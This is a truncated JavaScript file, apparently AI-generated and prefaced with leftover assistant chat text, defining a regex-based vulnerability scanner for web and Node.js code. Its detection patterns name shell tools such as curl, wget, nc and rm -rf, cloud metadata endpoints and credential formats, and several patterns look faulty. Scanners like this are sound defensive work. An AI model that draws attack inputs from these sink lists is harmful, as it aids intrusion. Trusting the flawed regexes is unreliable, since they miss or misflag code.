/*
🎯 COMPLETE JAVASCRIPT VULNERABILITY HUNTING MATRIX
You're absolutely right! Let me create a comprehensive vulnerability hunting system that covers ALL critical JS vulnerabilities with exact line locations and table-formatted results.

🔍 FULL SPECTRUM VULNERABILITY HUNTER - CLIENT & SERVER-SIDE + FRAMEWORKS
Enhanced for browser JavaScript, Node.js server-side, React, Next.js, Vue, Angular, Svelte, Ember, and modern JS frameworks
*/

// 🏆 COMPLETE JAVASCRIPT VULNERABILITY HUNTING MATRIX
// 🔒 HARDENED VERSION - Security fixes applied
// ⚠️ For educational and security testing purposes only

class CompleteJSVulnHunter {
    constructor(options = {}) {
        this._startTime = performance.now();
        this._configWhitelist = new Set([
            'quiet', 'enableAST', 'enableTaint', 'confidenceThreshold',
            'maxFetchTimeout', 'maxScriptSize', 'enableScriptInjection'
        ]);

        this.quiet = options.quiet || false;
        this.enableAST = options.enableAST !== false;
        this.enableTaint = options.enableTaint !== false;
        this.confidenceThreshold = options.confidenceThreshold || 0.3;
        this.maxFetchTimeout = options.maxFetchTimeout || 2000;
        this.maxScriptSize = options.maxScriptSize || 5000000;
        this.enableScriptInjection = options.enableScriptInjection || false;

        this.astParser = null;
        this.taintEngine = null;
        this.semanticAnalyzer = null;

        this._compiledPatternCache = new Map();
        this._dedupIndex = new Map();

        this.vulnerabilityTypes = {
            // CLIENT-SIDE CRITICAL
            'DOM-Based XSS': {
                patterns: [
                    // Sinks that indicate DOM XSS (not just source access)
                    'innerHTML\\s*=\\s*[^;]*(?:location|search|hash|cookie|document\\.referrer|window\\.name|postMessage)',
                    'outerHTML\\s*=\\s*[^;]*(?:location|search|hash|cookie|document\\.referrer|window\\.name)',
                    'insertAdjacentHTML\\s*\\([^,]+,\\s*[^)]*(?:location|search|hash|cookie)',
                    'document\\.write\\s*\\([^)]*(?:location|search|hash|cookie|document\\.referrer)',
                    'document\\.writeln\\s*\\([^)]*(?:location|search|hash|cookie)',
                    '\\.html\\s*\\([^)]*(?:location|search|hash|cookie|document\\.referrer)',  // jQuery
                    '\\.append\\s*\\([^)]*(?:location|search|hash|cookie)',
                    '\\.prepend\\s*\\([^)]*(?:location|search|hash|cookie)',
                    // Script creation with dynamic source
                    'createElement\\s*\\(\\s*["\']script["\']\\s*\\)[^;]*\\.src\\s*=\\s*[^;]*(?:location|search|hash)',
                    'createElement\\s*\\(\\s*["\']script["\']\\s*\\)[^;]*textContent\\s*=',
                    // URL assignment with user input
                    '\\.href\\s*=\\s*[^;]*(?:location|search|hash|document\\.referrer)',
                    '\\.src\\s*=\\s*[^;]*(?:location|search|hash|document\\.referrer)',
                    '\\.action\\s*=\\s*[^;]*(?:location|search|hash)',
                    // javascript: URI with user-controlled input
                    '(?:href|src|action)\\s*=\\s*["\']javascript:',
                    'location\\.href\\s*=\\s*["\']javascript:',
                    // eval/Function with user-controlled input
                    '\\beval\\s*\\([^)]*(?:location|search|hash|cookie|document\\.referrer|window\\.name)',
                    '\\bFunction\\s*\\([^)]*(?:location|search|hash|cookie)',
                    // Framework-specific XSS (require user input context)
                    'dangerouslySetInnerHTML\\s*=\\s*\\{[^}]*__(?:html|dangerouslySetInnerHTML)[^}]*\\}',
                    'dangerouslySetInnerHTML\\s*=\\s*\\{[^}]*userInput',
                    'dangerouslySetInnerHTML\\s*=\\s*\\{[^}]*location',
                    'v-html\\s*=\\s*["\'][^"\']*\\$\\{',
                    'v-html\\s*=\\s*["\'][^"\']*location',
                    '\\[innerHTML\\]\\s*=\\s*[^;]*(?:location|search|userInput)',
                    '\\[outerHTML\\]\\s*=\\s*[^;]*(?:location|search)',
                    '{@html\\s+[^}]*location',
                    'bypassSecurityTrustHtml\\s*\\(',
                    'htmlSafe\\s*\\([^)]*(?:location|search|userInput)',
                    // Template literal injection
                    '\\.html\\s*\\(`[^`]*\\$\\{[^}]*location',
                    '\\.html\\s*\\(`[^`]*\\$\\{[^}]*search'
                ],
                severity: 'CRITICAL',
                description: 'DOM manipulation with unsanitized user-controlled input (source→sink)'
            },


            
            'Prototype Pollution': {
                patterns: [
                    // Actual prototype pollution sinks
                    '\\[\\s*["\']__proto__["\']\\s*\\]\\s*=',
                    '\\[\\s*["\']constructor["\']\\s*\\]\\s*\\[\\s*["\']prototype["\']\\s*\\]\\s*=',
                    '\\.\\s*__proto__\\s*=',
                    '\\.constructor\\.prototype\\s*=',
                    // Dangerous merge functions with user input
                    '\\.merge\\s*\\([^)]*(?:req|query|params|body|input)',
                    '\\.extend\\s*\\([^)]*(?:req|query|params|body|input)',
                    'deepMerge\\s*\\([^)]*(?:req|query|params|body|input)',
                    'deepExtend\\s*\\([^)]*(?:req|query|params|body|input)',
                    // Object.assign with user-controlled source
                    'Object\\.assign\\s*\\([^,]+,\\s*(?:req\\.(?:body|query|params)|query|params|input|data)',
                    // for-in without hasOwnProperty guard
                    'for\\s*\\(\\s*(?:let|var|const)\\s+\\w+\\s+in\\s+\\w+\\s*\\)\\s*\\{[^}]*\\[\\s*\\w+\\s*\\]',
                    // Unsafe property access with user input
                    '\\[\\s*(?:req|query|params|body)\\.\\w+\\s*\\]\\s*='
                ],
                severity: 'HIGH',
                description: 'Prototype pollution via __proto__ assignment or unsafe merge with user input'
            },



            'Code Execution': {
                patterns: [
                    'eval\\s*\\([^)]*(?:req|query|params|body|location|input|search|hash|cookie|\\$\\{)',
                    'new\\s+Function\\s*\\([^)]*(?:req|query|params|body|location|input|\\$\\{)',
                    '\\bFunction\\s*\\(["\'][^"\']*(?:req|query|params|body|location|\\$\\{)',
                    '\\bsetTimeout\\s*\\(\\s*["\'][^"\']*(?:req|query|params|body|location|input|\\$\\{)',
                    '\\bsetInterval\\s*\\(\\s*["\'][^"\']*(?:req|query|params|body|location|input|\\$\\{)',
                    'window\\[\\s*["\']eval["\']\\s*\\]\\s*\\(',
                    'window\\[\\s*["\']Function["\']\\s*\\]\\s*\\(',
                    'document\\.write\\s*\\([^)]*(?:req|query|params|body|location|input)',
                    '\\.innerHTML\\s*=\\s*[^;]*(?:eval|Function|setTimeout|setInterval)',
                    'script\\.innerHTML\\s*=\\s*["\']',
                    'script\\.text\\s*=\\s*["\'][^"\']*(?:req|query|params|location)',
                    'location\\.href\\s*=\\s*["\']javascript:',
                    '(?:src|href)\\s*=\\s*["\']javascript:',
                    '\\bpostMessage\\s*\\([^)]*\\*\\s*\\)',
                    '\\bimportScripts\\s*\\([^)]*(?:req|query|params|location)',
                    'self\\[\\s*["\']onmessage["\']\\s*\\]\\s*=\\s*new\\s+Function'
                ],
                severity: 'CRITICAL',
                description: 'Dynamic code execution with user-controlled input'
            },


            'Event Handler Injection': {
                patterns: [
                    // Dynamic event handler assignment with user input
                    'setAttribute\\s*\\(\\s*["\']on\\w+["\']\\s*,\\s*[^)]*(?:location|search|hash|input|query)',
                    '\\.on\\w+\\s*=\\s*[^;]*(?:location|search|hash|input)',
                    'document\\.on\\w+\\s*=\\s*[^;]*(?:location|search|hash)',
                    'window\\.on\\w+\\s*=\\s*[^;]*(?:location|search|hash)',
                    // setTimeout/setInterval with string containing event handlers
                    'setTimeout\\s*\\(\\s*["\'][^"\']*on\\w+',
                    'setInterval\\s*\\(\\s*["\'][^"\']*on\\w+',
                    // eval with event handler code
                    'eval\\s*\\(\\s*["\'][^"\']*on\\w+',
                    'Function\\s*\\(\\s*["\'][^"\']*on\\w+'
                ],
                severity: 'HIGH',
                description: 'Dynamic event handler injection with user-controlled code'
            },


            'Insecure Storage': {
                patterns: [
                    'localStorage\\.',
                    'sessionStorage\\.',
                    'document\\.cookie\\s*=',
                    'window\\.localStorage',
                    'window\\.sessionStorage',
                    'Storage\\.prototype',
                    'document\\.cookie\\s*\\+=',
                    'Object\\.defineProperty\\s*\\(\\s*document\\s*,\\s*["\']cookie["\']',
                    'Object\\.defineProperty\\s*\\(\\s*window\\s*,\\s*["\']localStorage["\']',
                    'Object\\.defineProperty\\s*\\(\\s*window\\s*,\\s*["\']sessionStorage["\']'
                ],
                severity: 'MEDIUM',
                description: 'Sensitive data in client-side storage'
            },


            'Insecure Random': {
                patterns: [
                    // Math.random() used for security-sensitive purposes
                    'Math\\.random\\s*\\(\\)\\s*\\.\\s*toString\\s*\\(\\s*36\\s*\\)',  // Token generation
                    'Math\\.random\\s*\\(\\)\\s*\\.\\s*toString\\s*\\(\\s*16\\s*\\)',  // Hex token
                    'Math\\.random\\s*\\(\\)\\s*\\*\\s*[0-9a-fA-F]+\\s*\\.\\s*toString',
                    // Used with crypto-like variable names
                    'Math\\.random\\s*\\(\\)[^;]*(?:token|key|secret|password|hash|nonce|salt)',
                    '(?:token|key|secret|password|hash|nonce|salt)[^;]*Math\\.random',
                    'Array\\.from\\s*\\(\\s*\\{[^}]*Math\\.random',
                    // Token/ID generation with Math.random
                    '(?:generateToken|generateId|generateKey|createToken)\\s*\\([^)]*Math\\.random',
                    'Math\\.floor\\s*\\(\\s*Math\\.random\\s*\\(\\)\\s*\\*\\s*\\d+\\s*\\)\\s*\\.\\s*toString'
                ],
                severity: 'MEDIUM',
                description: 'Cryptographically insecure random used for security-sensitive values'
            },
            

            // SERVER-SIDE & NODE.JS SPECIFIC
            'SSRF': {
                patterns: [
                    // User input flowing to HTTP request (real SSRF)
                    '(?:fetch|axios|got|request|http\\.get|http\\.request)\\s*\\([^)]*(?:req\\.(?:query|body|params)|location\\.(?:search|hash|href)|input|url\\s*\\+)',
                    'new\\s+URL\\s*\\([^)]*(?:req\\.(?:query|body|params)|location\\.(?:search|hash|href)|input)',
                    // Hardcoded internal/metadata endpoints
                    'http[s]?://169\\.254\\.169\\.254',
                    'http[s]?://metadata\\.google\\.internal',
                    'http[s]?://localhost:\\d+',
                    'http[s]?://127\\.0\\.0\\.1:\\d+',
                    // SSRF via redirect bypass
                    '(?:followRedirect|redirect\\s*:\\s*["\']follow["\'])[^}]*(?:url|uri|target)',
                    // Server-side fetch with user-controlled URL
                    'axios\\s*\\([^)]*(?:req\\.(?:query|body|params|headers)\\.)',
                    'node-fetch\\s*\\([^)]*(?:req\\.(?:query|body|params)\\.)',
                    // Dynamic URL construction for HTTP requests
                    '(?:fetch|axios|request|got)\\s*\\(\\s*`[^`]*\\$\\{[^}]*(?:req|query|params|body|input)',
                    '(?:fetch|axios|request|got)\\s*\\(\\s*["\'][^"\']*\\+\\s*(?:req\\.|query|params|body|input)'
                ],
                severity: 'HIGH',
                description: 'Server-side request forgery - user-controlled URL used in HTTP request'
            },


            'IDOR': {
                patterns: [
                    // API endpoints using user-controlled IDs
                    'fetch\\s*\\(\\s*["\'][^"\']*(?:\\/users?|\\/accounts?|\\/orders?|\\/admin|\\/profile|\\/invoices?)\\/$\\{',
                    'axios\\s*\\.\\s*(?:get|put|delete|patch)\\s*\\(\\s*["\'][^"\']*(?:\\/users?|\\/accounts?|\\/orders?|\\/admin|\\/profile|\\/invoices?)\\/$\\{',
                    // Direct parameter access without owner check
                    'req\\.params\\.(?:userId|accountId|orderId|id)\\b(?!.*(?:owner|user).*===)',
                    'req\\.query\\.(?:userId|accountId|orderId|id)\\b(?!.*(?:owner|user).*===)',
                    // Database queries with user-controlled ID
                    '(?:db|Model)\\.\\w+\\.find(?:One)?\\s*\\(\\s*\\{\\s*(?:_?id|userId|accountId)\\s*:\\s*req\\.(?:params|query|body)\\.',
                    // URL parameter manipulation indicators
                    '[?&](?:userId|accountId|orderId|invoiceId|uid)=\\$\\{',
                    // Sequential/predictable ID patterns
                    '\\/(?:users?|accounts?|orders?)\\/[0-9]+(?:\\/|$)',
                    'req\\.params\\.id\\b(?!.*(?:session|auth|owner).*match)',
                    // API routes with numeric IDs
                    '\\/api\\/(?:v\\d+\\/)?(?:users?|accounts?|orders?)\\/[0-9]+'
                ],
                severity: 'CRITICAL',
                description: 'Insecure Direct Object Reference - user-controlled resource access without authorization'
            },



            'Client-Side Injection': {
                patterns: [
                    // Template injection with user input
                    'eval\\s*\\([^)]*(?:req|query|params|body|location|search|hash|input)',
                    'Function\\s*\\([^)]*(?:req|query|params|body|location|input)',
                    'setTimeout\\s*\\(\\s*["\'][^"\']*(?:req|query|params|body|location|\\$\\{)',
                    'setInterval\\s*\\(\\s*["\'][^"\']*(?:req|query|params|body|location|\\$\\{)',
                    'document\\.write\\s*\\([^)]*(?:req|query|params|body|location|input)',
                    'innerHTML\\s*=\\s*[^;]*(?:req|query|params|body|location|search|input|\\$\\{)',
                    'outerHTML\\s*=\\s*[^;]*(?:req|query|params|body|location|input)',
                    'location\\.href\\s*=\\s*[^;]*(?:req|query|params|body|input|\\$\\{)',
                    // Framework injection with user input
                    'dangerouslySetInnerHTML\\s*=\\s*\\{[^}]*(?:req|query|params|input|location)',
                    'v-html\\s*=\\s*["\'][^"\']*(?:req|query|params|input|\\$\\{)',
                    '\\[innerHTML\\]\\s*=\\s*[^;]*(?:req|query|params|input|location)',
                    // Template literal injection into sinks
                    '\\.innerHTML\\s*=\\s*`[^`]*\\$\\{[^}]*(?:req|query|params|body|input)',
                    '\\.outerHTML\\s*=\\s*`[^`]*\\$\\{[^}]*(?:req|query|params|body|input)',
                    '\\.html\\s*\\(`[^`]*\\$\\{[^}]*(?:req|query|params|body|input)',
                    // RegExp injection
                    'new\\s+RegExp\\s*\\([^)]*(?:req|query|params|body|input)',
                    // Framework template injection
                    '\\{\\{[^}]*(?:req|query|params|body|input)\\}\\}',
                    'router\\.push\\s*\\([^)]*(?:req|query|params|body|input|\\$\\{)',
                    'navigate\\s*\\([^)]*(?:req|query|params|body|input)',
                    'history\\.push\\s*\\([^)]*(?:req|query|params|body|input)',
                    // State management injection
                    'setState\\s*\\([^)]*(?:req|query|params|body|input|location)',
                    'dispatch\\s*\\([^)]*(?:req|query|params|body|input)',
                    'commit\\s*\\([^)]*(?:req|query|params|body|input)'
                ],
                severity: 'HIGH',
                description: 'Client-side injection with user-controlled input in dangerous sinks'
            },


            'JWT Manipulation': {
                patterns: [
                    // Algorithm manipulation (critical)
                    '(?:algorithm|alg)\\s*:\\s*["\']none["\']',
                    '(?:algorithm|alg)\\s*:\\s*["\']HS256["\']',
                    // Key confusion
                    '(?:secret|key)\\s*=\\s*publicKey',
                    '(?:secret|key)\\s*=\\s*(?:req\\.(?:query|body|params)\\.)',
                    // Hardcoded JWT tokens
                    'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+',
                    'token\\s*[:=]\\s*["\']eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+["\']',
                    // Token in URL (leaks in logs/referrer)
                    '(?:url|href|redirect)\\s*[:=]\\s*["\'][^"\']*token=[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+',
                    // Missing token verification
                    'jwt\\.verify\\s*\\([^,]+\\s*,\\s*(?:["\'][^"\']+["\']|\\w+)\\s*\\)\\s*\\{[^}]*return\\s+(?!decoded|err)',
                    // Token stored in localStorage (XSS-accessible)
                    'localStorage\\.setItem\\s*\\([^)]*(?:jwt|token|access_token|auth)',
                    // Token manipulation
                    'token\\s*=\\s*token\\.split\\s*\\(\\s*["\']\\.["\']\\s*\\)\\[1\\]',
                    'atob\\s*\\(\\s*token\\.split\\s*\\(\\s*["\']\\.["\']\\s*\\)\\[1\\]',
                    // JWT signing with weak secret
                    'jwt\\.sign\\s*\\([^,]+\\s*,\\s*["\'][^"\']{1,32}["\']\\s*\\)',
                    'jsonwebtoken\\.sign\\s*\\([^,]+\\s*,\\s*["\'][^"\']{1,32}["\']\\s*\\)'
                ],
                severity: 'HIGH',
                description: 'JWT security flaw - algorithm manipulation, key confusion, token in localStorage'
            },

            'CORS Misconfiguration': {
                patterns: [
                    // Server-side CORS misconfigs
                    'Access-Control-Allow-Origin\\s*:\\s*\\*',
                    'Access-Control-Allow-Origin\\s*:\\s*["\']http://[^"\']+["\']',
                    'Access-Control-Allow-Credentials\\s*:\\s*true[^}]*Access-Control-Allow-Origin\\s*:\\s*\\*',
                    // Express default CORS (no config = allow all)
                    'app\\.use\\s*\\(\\s*cors\\s*\\(\\s*\\)\\s*\\)',
                    'app\\.use\\s*\\(\\s*cors\\s*\\(\\s*\\{\\s*\\}\\s*\\)\\)',
                    // CORS with wildcard + credentials
                    'cors\\s*\\(\\s*\\{[^}]*origin\\s*:\\s*["\']\\*["\'][^}]*credentials\\s*:\\s*true',
                    'cors\\s*\\(\\s*\\{[^}]*credentials\\s*:\\s*true[^}]*origin\\s*:\\s*["\']\\*["\']',
                    // postMessage with wildcard origin
                    'postMessage\\s*\\([^)]*\\*\\s*\\)',
                    // Origin validation bypass (HTTP comparison)
                    'if\\s*\\(\\s*(?:origin|req\\.headers\\.origin)\\s*===?\\s*["\']http://',
                    // CORS with null origin
                    'Access-Control-Allow-Origin\\s*:\\s*["\']null["\']'
                ],
                severity: 'MEDIUM',
                description: 'CORS misconfiguration - wildcard origin, credentials with wildcard, or no origin validation'
            },


            'Clickjacking': {
                patterns: [
                    // Missing X-Frame-Options indicators
                    'X-Frame-Options\\s*:\\s*ALLOW-FROM',
                    'Content-Security-Policy\\s*:\\s*frame-ancestors\\s+\\*',
                    // iframe with clickjacking-enabling attributes
                    'iframe[^>]*style\\s*=\\s*["\'][^"\']*opacity\\s*:\\s*0[^"\']*["\']',
                    'iframe[^>]*style\\s*=\\s*["\'][^"\']*visibility\\s*:\\s*hidden[^"\']*["\']',
                    'iframe[^>]*style\\s*=\\s*["\'][^"\']*z-index\\s*:\\s*-\\d+[^"\']*["\']',
                    // Framing detection bypass
                    'if\\s*\\(\\s*(?:window|self)\\s*!==\\s*(?:window\\.top|top)\\s*\\)',
                    'if\\s*\\(\\s*(?:window|self)\\s*===\\s*(?:window\\.top|top)\\s*\\)',
                    // Missing frame-busting
                    'top\\.location\\s*=\\s*self\\.location',
                    'parent\\.location\\s*=\\s*location'
                ],
                severity: 'MEDIUM',
                description: 'Potential clickjacking - missing or weak frame protection'
            },


            'Command Injection': {
                patterns: [
                    // Command execution with user input
                    'child_process\\.exec\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body|\\$\\{)',
                    'child_process\\.execSync\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body|\\$\\{)',
                    'child_process\\.spawn\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'child_process\\.spawnSync\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'child_process\\.fork\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'execa\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'shelljs\\.exec\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'cross-spawn\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // Dynamic command construction
                    'exec\\s*\\(\\s*["\'][^"\']*(?:\\+|\\$\\{)[^"]*(?:req|input|query|params|body)',
                    'execSync\\s*\\(\\s*["\'][^"\']*(?:\\+|\\$\\{)[^"]*(?:req|input|query|params|body)',
                    // os.system with user input
                    'os\\.system\\s*\\([^)]*(?:req|input|query|params|body)',
                    // Template literal command injection
                    '`\\s*(?:rm|del|format|shutdown|reboot|cat|ls|wget|curl|ping|nc)\\s+[^`]*\\$\\{[^}]*(?:req|input|query|params)',
                    // eval with system commands
                    'eval\\s*\\(\\s*["\'](?:rm|del|format|shutdown|reboot|cat|ls|wget|curl|ping)\\s+',
                    // Dangerous command strings
                    'child_process\\.exec\\s*\\(\\s*["\']rm\\s+-rf',
                    'child_process\\.exec\\s*\\(\\s*["\']del\\s+'
                ],
                severity: 'CRITICAL',
                description: 'Command injection - user input flows into system command execution'
            },
            
            
            
            'Path Traversal': {
                patterns: [
                    // File operations with user-controlled paths
                    'fs\\.readFile\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body|\\+\\s*(?:req|input|query))',
                    'fs\\.readFileSync\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body|\\+\\s*(?:req|input|query))',
                    'fs\\.writeFile\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body|\\+\\s*(?:req|input|query))',
                    'fs\\.writeFileSync\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body|\\+\\s*(?:req|input|query))',
                    'fs\\.appendFile\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body|\\+\\s*(?:req|input|query))',
                    'fs\\.createReadStream\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body|\\+\\s*(?:req|input|query))',
                    'fs\\.createWriteStream\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body|\\+\\s*(?:req|input|query))',
                    // Directory traversal sequences in code
                    'path\\.join\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'path\\.resolve\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    '__dirname\\s*\\+\\s*[^;]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'process\\.cwd\\(\\)\\s*\\+\\s*[^;]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // Template literal path traversal
                    '`[^`]*(?:fs\\.|readFile|writeFile|createReadStream)[^`]*\\$\\{[^}]*(?:req|input|query|params)',
                    // open() with user input
                    'open\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // sendFile with user input
                    'sendFile\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)'
                ],
                severity: 'HIGH',
                description: 'Path traversal - user input flows into file system operations'
            },


            'Deserialization': {
                patterns: [
                    // Unsafe deserialization with user input
                    'vm\\.runInContext\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'vm\\.runInNewContext\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'vm\\.runInThisContext\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // YAML deserialization (known vulnerability)
                    'yaml\\.load\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'yaml\\.safeLoad\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'js-yaml\\.load\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // Unsafe YAML load without safeLoad
                    'yaml\\.load\\s*\\(\\s*(?:req\\.|input|query|params|body)',
                    // Prototype pollution via deserialization
                    'JSON\\.parse\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)\\s*(?:,|\\))\\s*\\.(?:hasOwnProperty|constructor|__proto__)',
                    // Node.js vm with user input (RCE)
                    'new\\s+Function\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // innerHTML with JSON.parse (DOM clobbering vector)
                    'innerHTML\\s*=\\s*JSON\\.parse\\s*\\([^)]*(?:req|input|query|params|body)',
                    // Dangerous deserialization libraries
                    'node-serialize\\s*\\(\\s*[^)]*(?:req|input|query|params|body)',
                    // PHP-style unserialize in JS polyfills
                    'unserialize\\s*\\([^)]*(?:req|input|query|params|body)'
                ],
                severity: 'HIGH',
                description: 'Unsafe deserialization - user input in dangerous parsers (vm, yaml, JSON.parse into sinks)'
            },


            'Broken Access Control': {
                patterns: [
                    // Weak equality in auth checks (type coercion bypass)
                    'if\\s*\\(\\s*req\\.user\\.role\\s*==\\s*["\']admin["\']\\s*\\)',
                    'if\\s*\\(\\s*user\\.role\\s*==\\s*["\']admin["\']\\s*\\)',
                    'if\\s*\\(\\s*decoded\\.role\\s*==\\s*["\']admin["\']\\s*\\)',
                    'userId\\s*==\\s*req\\.user',
                    'userId\\s*!=\\s*req\\.user',
                    // Missing auth on admin routes (no middleware)
                    'app\\.(get|post|put|delete|patch)\\s*\\(\\s*["\']\\/admin[^"\']*["\']\\s*,\\s*(?:async\\s*)?\\(',
                    'router\\.(get|post|put|delete|patch)\\s*\\(\\s*["\']\\/admin[^"\']*["\']\\s*,\\s*(?:async\\s*)?\\(',
                    // Database queries using user-controlled ID without auth
                    'db\\.\\w+\\.find(?:One)?\\s*\\(\\s*\\{[^}]*id\\s*:\\s*req\\.params\\.id[^}]*\\}\\s*\\)\\s*\\.(?:then|catch)',
                    'User\\.find(?:ById)?\\s*\\(\\s*req\\.params\\.id\\s*\\)',
                    // API calls with user-controlled IDs
                    'fetch\\s*\\(\\s*["\'][^"\']*\\/api\\/[a-z]+\\/$\\{[^}]*\\}',
                    'axios\\s*\\.\\s*(?:get|put|delete|patch)\\s*\\(\\s*["\'][^"\']*\\/api\\/[a-z]+\\/$\\{[^}]*\\}',
                    // Authorization header bypass
                    'if\\s*\\(\\s*!\\s*req\\.headers\\.authorization\\s*\\)\\s*return\\s*\\d+',
                    // Role check without owner verification
                    'if\\s*\\(\\s*(?:user|decoded)\\.role\\s*!==?\\s*["\']admin["\']\\s*\\)\\s*(?:return|throw)'
                ],
                severity: 'CRITICAL',
                description: 'Missing or weak access control - IDOR, auth bypass, privilege escalation'
            },
            

            'Sensitive Data Exposure': {
                patterns: [
                    // Hardcoded credentials (actual values, not env var references)
                    '(?:apiKey|api_key|API_KEY|APIKEY)\\s*[:=]\\s*["\'][^"\']{8,}["\']',
                    '(?:secret|SECRET|SecretKey)\\s*[:=]\\s*["\'][^"\']{8,}["\']',
                    '(?:password|passwd|pwd|PASSWORD)\\s*[:=]\\s*["\'][^"\']{4,}["\']',
                    '(?:accessToken|access_token|ACCESS_TOKEN)\\s*[:=]\\s*["\'][A-Za-z0-9_\\-\\.]{20,}["\']',
                    '(?:refreshToken|refresh_token)\\s*[:=]\\s*["\'][A-Za-z0-9_\\-\\.]{20,}["\']',
                    // Cloud service hardcoded keys
                    'AKIA[0-9A-Z]{16}',                                      // AWS Access Key
                    '(?:AWS_SECRET_ACCESS_KEY|aws_secret_access_key)\\s*[:=]\\s*["\'][A-Za-z0-9/+=]{40}["\']',
                    'sk_live_[0-9a-zA-Z]{24,}',                              // Stripe live key
                    'pk_live_[0-9a-zA-Z]{24,}',                              // Stripe publishable
                    'sk_test_[0-9a-zA-Z]{24,}',                              // Stripe test key
                    'ghp_[A-Za-z0-9]{36}',                                   // GitHub PAT
                    'glpat-[A-Za-z0-9\\-_]{20,}',                            // GitLab PAT
                    'xox[bpsa]-[0-9a-zA-Z\\-]{10,}',                         // Slack token
                    '[0-9]{1,2}\\.[0-9]{1,2}\\.[0-9]{1,2}\\.[0-9]{1,2}:[0-9]+:[A-Za-z0-9]+',  // IP:port:secret
                    // Database connection strings with credentials
                    '(?:mysql|postgresql|mongodb|redis|amqp):\\/\\/[^\\s]*:[^\\s]*@[^\\s]+',
                    // Firebase config with API key
                    'firebaseConfig[^}]*apiKey\\s*:\\s*["\'][^"\']+["\']',
                    // Hardcoded JWT tokens
                    'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+',
                    // Base64 encoded secrets (long strings)
                    '(?:secret|key|token|password|credential)\\s*[:=]\\s*["\'][A-Za-z0-9+/]{40,}={0,2}["\']',
                    // Console.log with sensitive data
                    'console\\.log\\s*\\([^)]*(?:password|secret|token|key|credential)',
                    // Private keys
                    '-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'
                ],
                severity: 'CRITICAL',
                description: 'Hardcoded credentials, secrets, or sensitive data exposed in code'
            },
            
            'SQL Injection': {
                patterns: [
                    // Raw SQL with string concatenation of user input
                    '(?:SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|CREATE)\\s+.*(?:\\+|\\$\\{|\\$\d+|\\?).*\\b(?:FROM|INTO|SET|WHERE)\\b',
                    'query\\s*\\(\\s*["\'][^"\']*(?:SELECT|INSERT|UPDATE|DELETE)[^"\']*(?:\\+|\\$\\{|req\\.|query|params|body)',
                    'execute\\s*\\(\\s*["\'][^"\']*(?:SELECT|INSERT|UPDATE|DELETE)[^"\']*(?:\\+|\\$\\{|req\\.|query|params|body)',
                    // Template literal SQL injection
                    '`\\s*(?:SELECT|INSERT|UPDATE|DELETE)\\s+[^`]*\\$\\{[^}]*(?:req|query|params|body|input)',
                    // ORM injection via raw query
                    'sequelize\\.query\\s*\\(\\s*["\'][^"\']*(?:\\+|\\$\\{)',
                    'knex\\s*\\(\\s*["\'][^"\']*(?:\\+|\\$\\{)',
                    // MySQL/pg with concatenation
                    '(?:mysql|pg|sqlite3)\\.query\\s*\\(\\s*["\'][^"\']*(?:\\+|\\$\\{)',
                    // MongoDB injection
                    '\\$where\\s*:\\s*["\'][^"\']*(?:req|query|params|body)',
                    '\\$regex\\s*:\\s*[^}]*(?:req|query|params|body)',
                    // Raw SQL builder
                    'raw\\s*\\(\\s*["\'][^"\']*(?:SELECT|INSERT|UPDATE|DELETE)[^"\']*(?:\\+|\\$\\{)'
                ],
                severity: 'CRITICAL',
                description: 'SQL/NoSQL injection via unsanitized user input in database queries'
            },

            'Node.js Security Issues': {
                patterns: [
                    // CORS without origin restriction
                    'app\\.use\\s*\\(\\s*cors\\s*\\(\\s*\\)\\s*\\)',
                    // Unsafe file upload without validation
                    'multer\\s*\\(\\s*\\{[^}]*\\}\\s*\\)(?!.*(?:fileFilter|limits|storage))',
                    // process.exit in request handlers
                    'process\\.exit\\s*\\(\\s*(?:0|1)\\s*\\)(?!.*(?:uncaughtException|unhandledRejection))',
                    // Hardcoded session/JWT secrets
                    'jwt\\.sign\\s*\\([^,]+\\s*,\\s*["\'][^"\']{1,32}["\']',
                    'jsonwebtoken\\.sign\\s*\\([^,]+\\s*,\\s*["\'][^"\']{1,32}["\']',
                    'session\\s*\\(\\s*\\{[^}]*secret\\s*:\\s*["\'][^"\']{1,32}["\']',
                    // DB connection with hardcoded password
